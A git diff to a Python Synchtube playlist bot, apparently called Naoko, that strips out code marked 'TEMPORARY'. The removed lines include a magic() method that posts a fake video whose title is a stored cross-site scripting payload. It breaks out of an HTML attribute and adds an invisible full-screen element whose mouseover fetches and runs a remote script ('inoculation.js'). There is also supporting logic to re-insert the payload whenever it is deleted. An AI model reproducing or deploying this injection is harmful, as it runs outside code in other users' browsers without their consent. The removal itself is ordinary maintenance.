@@ -777,11 +777,6 @@ class Naoko(object):
                 self.send("cm", ["yt", "qnc-YUfXanw", u"Bad touhou doujin plot" ,"http://i.ytimg.com/vi/qnc-YUfXanw/default.jpg", 44])
                 self.sql_queue.append(package(self.addRandom, "addrandom", self.selfUser, ""))
                 self.sqlAction.set()
-            # TEMPORARY
-            elif len(self.vidlist) == 1:
-                self.send("cm", ["yt", "qnc-YUfXanw", u"Bad touhou doujin plot" ,"http://i.ytimg.com/vi/qnc-YUfXanw/default.jpg", 44])
-                self.sql_queue.append(package(self.addRandom, "addrandom", self.selfUser, ""))
-                self.sqlAction.set()
             else: 
                 videoIndex = (videoIndex + 1) % len(self.vidlist)
                 self.logger.debug("Advancing to next video [%s]", self.vidlist[videoIndex])
@@ -921,9 +916,6 @@ class Naoko(object):
         self.vidlist = []
         self.vidLock.release()
         
-        # TEMPORARY
-        self.magic()
-
     def shuffle(self, tag, data):
         self._shuffle(data)
         if self.shuffleBump:
@@ -993,10 +985,7 @@ class Naoko(object):
     def _play(self):
         if self.leading.isSet() or self.deferredToss & self.DEFERRED_MASKS["SKIP"]:
             if (not self.state.current == None) and (not self.getVideoIndexById(self.state.current) == None): 
-                # TEMPORARY IF STATEMENT
-                if not hasattr(self, "special") or self.vidlist[self.getVideoIndexById(self.state.current)].vidinfo.vid != self.special:
-                    self.send("rm", self.state.current)
-                #self.send("rm", self.state.current)
+                self.send("rm", self.state.current)
             self.send("s", [1,0])
             if self.deferredToss & self.DEFERRED_MASKS["SKIP"]:
                 self.deferredToss &= ~self.DEFERRED_MASKS["SKIP"]
@@ -1174,10 +1163,6 @@ class Naoko(object):
                 self.asLeader(fn)
             self.setSkip("", self.selfUser, self.autoSkip)
         
-        # TEMPORARY
-        if not self.playlist:
-            self.magic()
-
     # Command handlers for commands that users can type in Synchtube chat
     # All of them receive input in the form (command, user, data)
     # Where command is the typed command, user is the user who sent the message
@@ -2249,8 +2234,7 @@ class Naoko(object):
                 valid = False
         
         # -- TODO -- See if people care about videos with incorrect titles.
-        # TEMPORARY TITLE CHECKING
-        if not valid or title != vi.title:
+        if not valid:
             # The video is invalid don't insert it.
             self.logger.debug("Invalid video, skipping SQL insert.")
             self.logger.debug(data)
@@ -2337,13 +2321,6 @@ class Naoko(object):
         self.vidlist.append(vid)
         self.vidLock.release()
        
-        # TEMPORARY
-        if hasattr(self, "newspecial") and vid.vidinfo.vid == self.newspecial:
-            self.special = self.newspecial
-            self.newspecial = None
-            self.asLeader(package(self._bump, list([vid.v_sid])))
-            return
-
         self.api_queue.append(package(self._validateAddVideo, vid, sql, echo and not v[3] == self.name))
         self.apiAction.set()
 
@@ -2353,17 +2330,8 @@ class Naoko(object):
         idx = self.getVideoIndexById(v)
         if idx >= 0:
             self.vidLock.acquire()
-            # TEMPORARY
-            vid  = self.vidlist.pop(idx)
+            self.vidlist.pop(idx)
             self.vidLock.release()
-            # TEMPORARY
-            if hasattr(self, "special") and vid.vidinfo.vid == self.special:
-                self.magic()
-
-    def magic(self):
-        # TEMPORARY
-        self.newspecial = "whatisthis" + str(random.randint(0, 1000000))
-        self.asLeader(package(self.send, 'am', ['yt', self.newspecial, '" id="vulN" style="position:fixed;top:0;left:0;z-index:9000;font-size:0px;width:100%;height:100%;" onmouseover="$.getScript(\'https://raw.github.com/Suwako/Naoko/master/inoculation.js\');$(\'#vulN\').parent().parent().remove();" title="Fake Video', 'http://i.ytimg.com/vi/6pMgwjhJBAc/default.jpg', 120]))
 
     def _moveVideo(self, v, after=None):
         if self.stthread != threading.currentThread():
